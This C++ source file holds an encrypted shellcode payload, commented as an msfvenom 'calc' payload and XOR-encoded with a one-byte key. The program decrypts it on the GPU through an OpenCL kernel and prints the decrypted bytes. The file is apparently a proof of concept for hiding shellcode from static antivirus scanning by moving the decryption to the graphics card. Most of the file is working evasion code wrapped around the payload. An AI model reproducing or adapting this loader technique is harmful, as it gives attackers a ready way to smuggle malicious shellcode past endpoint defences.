#include<iostream>
#include<string>
#include<fstream>
#define CL_HPP_TARGET_OPENCL_VERSION 300
#include <CL/opencl.hpp>
#include <vector>

#define SHELLCODE_LENGTH 276

const char* xorKernelSource[] = { //                                
"__kernel void decrypt(__global char* encrypted, __global char* password, __global char* output) { output[get_global_id(0)] = encrypted[get_global_id(0)] ^ password[0];  }"
};

const char* getErrorString(cl_int error)
{
    switch (error) {
        // run-time and JIT compiler errors
        case 0: return "CL_SUCCESS";
        case -1: return "CL_DEVICE_NOT_FOUND";
        case -2: return "CL_DEVICE_NOT_AVAILABLE";
        case -3: return "CL_COMPILER_NOT_AVAILABLE";
        case -4: return "CL_MEM_OBJECT_ALLOCATION_FAILURE";
        case -5: return "CL_OUT_OF_RESOURCES";
        case -6: return "CL_OUT_OF_HOST_MEMORY";
        case -7: return "CL_PROFILING_INFO_NOT_AVAILABLE";
        case -8: return "CL_MEM_COPY_OVERLAP";
        case -9: return "CL_IMAGE_FORMAT_MISMATCH";
        case -10: return "CL_IMAGE_FORMAT_NOT_SUPPORTED";
        case -11: return "CL_BUILD_PROGRAM_FAILURE";
        case -12: return "CL_MAP_FAILURE";
        case -13: return "CL_MISALIGNED_SUB_BUFFER_OFFSET";
        case -14: return "CL_EXEC_STATUS_ERROR_FOR_EVENTS_IN_WAIT_LIST";
        case -15: return "CL_COMPILE_PROGRAM_FAILURE";
        case -16: return "CL_LINKER_NOT_AVAILABLE";
        case -17: return "CL_LINK_PROGRAM_FAILURE";
        case -18: return "CL_DEVICE_PARTITION_FAILED";
        case -19: return "CL_KERNEL_ARG_INFO_NOT_AVAILABLE";

        // compile-time errors
        case -30: return "CL_INVALID_VALUE";
        case -31: return "CL_INVALID_DEVICE_TYPE";
        case -32: return "CL_INVALID_PLATFORM";
        case -33: return "CL_INVALID_DEVICE";
        case -34: return "CL_INVALID_CONTEXT";
        case -35: return "CL_INVALID_QUEUE_PROPERTIES";
        case -36: return "CL_INVALID_COMMAND_QUEUE";
        case -37: return "CL_INVALID_HOST_PTR";
        case -38: return "CL_INVALID_MEM_OBJECT";
        case -39: return "CL_INVALID_IMAGE_FORMAT_DESCRIPTOR";
        case -40: return "CL_INVALID_IMAGE_SIZE";
        case -41: return "CL_INVALID_SAMPLER";
        case -42: return "CL_INVALID_BINARY";
        case -43: return "CL_INVALID_BUILD_OPTIONS";
        case -44: return "CL_INVALID_PROGRAM";
        case -45: return "CL_INVALID_PROGRAM_EXECUTABLE";
        case -46: return "CL_INVALID_KERNEL_NAME";
        case -47: return "CL_INVALID_KERNEL_DEFINITION";
        case -48: return "CL_INVALID_KERNEL";
        case -49: return "CL_INVALID_ARG_INDEX";
        case -50: return "CL_INVALID_ARG_VALUE";
        case -51: return "CL_INVALID_ARG_SIZE";
        case -52: return "CL_INVALID_KERNEL_ARGS";
        case -53: return "CL_INVALID_WORK_DIMENSION";
        case -54: return "CL_INVALID_WORK_GROUP_SIZE";
        case -55: return "CL_INVALID_WORK_ITEM_SIZE";
        case -56: return "CL_INVALID_GLOBAL_OFFSET";
        case -57: return "CL_INVALID_EVENT_WAIT_LIST";
        case -58: return "CL_INVALID_EVENT";
        case -59: return "CL_INVALID_OPERATION";
        case -60: return "CL_INVALID_GL_OBJECT";
        case -61: return "CL_INVALID_BUFFER_SIZE";
        case -62: return "CL_INVALID_MIP_LEVEL";
        case -63: return "CL_INVALID_GLOBAL_WORK_SIZE";
        case -64: return "CL_INVALID_PROPERTY";
        case -65: return "CL_INVALID_IMAGE_DESCRIPTOR";
        case -66: return "CL_INVALID_COMPILER_OPTIONS";
        case -67: return "CL_INVALID_LINKER_OPTIONS";
        case -68: return "CL_INVALID_DEVICE_PARTITION_COUNT";

            // extension errors
        case -1000: return "CL_INVALID_GL_SHAREGROUP_REFERENCE_KHR";
        case -1001: return "CL_PLATFORM_NOT_FOUND_KHR";
        case -1002: return "CL_INVALID_D3D10_DEVICE_KHR";
        case -1003: return "CL_INVALID_D3D10_RESOURCE_KHR";
        case -1004: return "CL_D3D10_RESOURCE_ALREADY_ACQUIRED_KHR";
        case -1005: return "CL_D3D10_RESOURCE_NOT_ACQUIRED_KHR";
        default: return "Unknown OpenCL error";
    }
}

int main()
{
    // fc 48 ... msfvenom calc payload
    unsigned char buf[] = "\x97\x23\xe8\x8f\x9b\x83\xab\x6b\x6b\x6b\x2a\x3a\x2a\x3b\x39\x3a\x3d\x23\x5a\xb9\x0e\x23\xe0\x39\x0b\x23\xe0\x39\x73\x23\xe0\x39\x4b\x23\xe0\x19\x3b\x23\x64\xdc\x21\x21\x26\x5a\xa2\x23\x5a\xab\xc7\x57\x0a\x17\x69\x47\x4b\x2a\xaa\xa2\x66\x2a\x6a\xaa\x89\x86\x39\x2a\x3a\x23\xe0\x39\x4b\xe0\x29\x57\x23\x6a\xbb\xe0\xeb\xe3\x6b\x6b\x6b\x23\xee\xab\x1f\x0c\x23\x6a\xbb\x3b\xe0\x23\x73\x2f\xe0\x2b\x4b\x22\x6a\xbb\x88\x3d\x23\x94\xa2\x2a\xe0\x5f\xe3\x23\x6a\xbd\x26\x5a\xa2\x23\x5a\xab\xc7\x2a\xaa\xa2\x66\x2a\x6a\xaa\x53\x8b\x1e\x9a\x27\x68\x27\x4f\x63\x2e\x52\xba\x1e\xb3\x33\x2f\xe0\x2b\x4f\x22\x6a\xbb\x0d\x2a\xe0\x67\x23\x2f\xe0\x2b\x77\x22\x6a\xbb\x2a\xe0\x6f\xe3\x23\x6a\xbb\x2a\x33\x2a\x33\x35\x32\x31\x2a\x33\x2a\x32\x2a\x31\x23\xe8\x87\x4b\x2a\x39\x94\x8b\x33\x2a\x32\x31\x23\xe0\x79\x82\x3c\x94\x94\x94\x36\x23\xd1\x6a\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x23\xe6\xe6\x6a\x6a\x6b\x6b\x2a\xd1\x5a\xe0\x04\xec\x94\xbe\xd0\x9b\xde\xc9\x3d\x2a\xd1\xcd\xfe\xd6\xf6\x94\xbe\x23\xe8\xaf\x43\x57\x6d\x17\x61\xeb\x90\x8b\x1e\x6e\xd0\x2c\x78\x19\x04\x01\x6b\x32\x2a\xe2\xb1\x94\xbe\x08\x0a\x07\x08\x45\x0e\x13\x0e\x6b\x6b";

    unsigned char key[] = "k";

    char finalPayload[SHELLCODE_LENGTH] = { 0 };

    size_t dataSize = SHELLCODE_LENGTH;

    //get all platforms (drivers)
    std::vector<cl::Platform> all_platforms;
    cl::Platform::get(&all_platforms);
    if (all_platforms.size() == 0)
    {
        std::cout << " No platforms found. Check OpenCL installation!\n";
        exit(1);
    }
    cl::Platform default_platform = all_platforms[0];
    std::cout << "Using platform: " << default_platform.getInfo<CL_PLATFORM_NAME>() << "\n";

    //get default device of the default platform
    std::vector<cl::Device> all_devices;
    default_platform.getDevices(CL_DEVICE_TYPE_ALL, &all_devices);
    if (all_devices.size() == 0) 
    {
        std::cout << " No devices found. Check OpenCL installation!\n";
        exit(1);
    }
    cl::Device default_device = all_devices[0];
    std::cout << "Using device: " << default_device.getInfo<CL_DEVICE_NAME>() << "\n";

    // Setup OpenCL
    cl::Context context({ default_device });
    cl_int err;
    cl_command_queue queue = clCreateCommandQueueWithProperties(context.get(), default_device.get(), NULL, &err);   

    // setup buffers
    cl_mem shellcodeEncrypted = clCreateBuffer(context.get(), CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, dataSize, buf, &err);
    cl_mem xorKey = clCreateBuffer(context.get(), CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, sizeof(char), key, &err);
    cl_mem shellcodeDecryptedOut = clCreateBuffer(context.get(), CL_MEM_READ_WRITE, dataSize, NULL, &err);

    // Create kernel from source
    cl_program kernel = clCreateProgramWithSource(context.get(), 1, xorKernelSource, NULL, &err);
    if (err)
    {
        std::cout << "clCreateProgramWithSource: " << getErrorString(err) << std::endl;
    }
    cl_int res = clBuildProgram(kernel, 0, NULL, NULL, NULL, NULL);
    if (res != CL_BUILD_SUCCESS)
    {
        size_t len = 0;
        clGetProgramBuildInfo(kernel, default_device.get(), CL_PROGRAM_BUILD_LOG, 0, NULL, &len);
        char* buffer = (char*)malloc(len * sizeof(char));
        clGetProgramBuildInfo(kernel, default_device.get(), CL_PROGRAM_BUILD_LOG, len, buffer, NULL);
        std::cout << buffer << std::endl;
        free(buffer);
    }

    // Get a handle to the kernel function for decryption
    cl_kernel decryptKernelFunctionHandle = clCreateKernel(kernel, "decrypt", &err);
    if (err)
    {
        std::cout << "clCreateKernel: " << getErrorString(err) << std::endl;
    }

    // Set arguments for kernel
    clSetKernelArg(decryptKernelFunctionHandle, 0, sizeof(cl_mem), (void*)&shellcodeEncrypted);
    clSetKernelArg(decryptKernelFunctionHandle, 1, sizeof(cl_mem), (void*)&xorKey);
    clSetKernelArg(decryptKernelFunctionHandle, 2, sizeof(cl_mem), (void*)&shellcodeDecryptedOut);

    // Launch the kernel on the GPU with one work item per byte
    size_t workSize = SHELLCODE_LENGTH;
    err = clEnqueueNDRangeKernel(queue, decryptKernelFunctionHandle, 1, NULL, &workSize, NULL, 0, NULL, NULL);
    if (err)
    {
        std::cout << "clEnqueueNDRangeKernel: " << getErrorString(err) << std::endl;
    }

    // Copy the output from GPU memory back to CPU memory
    err = clEnqueueReadBuffer(queue, shellcodeDecryptedOut, CL_TRUE, 0, dataSize, finalPayload, 0, NULL, NULL);
    if (err)
    {
        std::cout << "clEnqueueReadBuffer: " << getErrorString(err) << std::endl;
    }

    // Print decrypted payload
    for (int i=0; i < SHELLCODE_LENGTH; i++)
    {
        printf("\\x%02x", (char)finalPayload[i]);
    }

    // Cleanup
    clReleaseKernel(decryptKernelFunctionHandle);
    clReleaseProgram(kernel);
    clReleaseCommandQueue(queue);
    clReleaseContext(context.get());
    clReleaseMemObject(shellcodeEncrypted);
    clReleaseMemObject(xorKey);
    clReleaseMemObject(shellcodeDecryptedOut);

    return 0;
}